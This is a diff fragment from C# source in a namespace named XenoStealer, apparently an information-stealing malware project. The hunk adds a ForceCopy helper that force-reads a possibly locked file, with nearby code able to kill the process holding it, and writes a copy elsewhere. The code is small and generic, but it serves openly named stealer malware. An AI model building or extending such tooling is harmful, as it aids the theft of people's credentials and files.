@@ -17,6 +17,25 @@ namespace XenoStealer
 
         private static RegistryView[] registryViews = new RegistryView[] { RegistryView.Registry64, RegistryView.Registry32 };
 
+        public static bool ForceCopy(string target, string destination) 
+        {
+            byte[] fileData = ForceReadFile(target);
+            if (fileData == null) 
+            {
+                return false;
+            }
+            try 
+            {
+                File.WriteAllBytes(destination, fileData);
+            } 
+            catch 
+            {
+                return false;
+            }
+            return true;
+
+        }
+
         public static string ForceReadFileString(string filePath, bool killOwningProcessIfCouldntAquire = false)
         {
             byte[] fileContent = ForceReadFile(filePath, killOwningProcessIfCouldntAquire);
